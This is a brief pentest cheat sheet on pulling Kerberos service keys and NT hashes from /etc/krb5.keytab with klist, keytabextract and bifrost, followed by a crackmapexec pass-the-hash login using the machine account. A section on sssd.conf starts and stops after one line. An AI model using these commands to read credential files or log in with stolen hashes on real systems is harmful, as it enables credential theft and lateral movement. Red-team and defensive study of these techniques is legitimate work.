# Extract Accounts locations

## From /etc/krb5.keytab

### The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure.

### Use klist to read the keytab file and parse its content. The key that you see when the key type is 23 is the actual NT Hash of the user.

 - klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab (Windows)

### On Linux you can use KeyTabExtract : we want RC4 HMAC hash to reuse the NTLM hash.

 - python3 keytabextract.py krb5.keytab

### On macOS you can use bifrost

 - ./bifrost -action dump -source keytab -path test

### Connect to the machine using the account and the hash with CME

 - crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0"

## From /etc/sssd/sssd.conf

### sss_obfuscate converts a given password into human-unreadable format and places it into appropriate domain section of the SSSD config file, usually located at /etc/sssd/sssd.conf

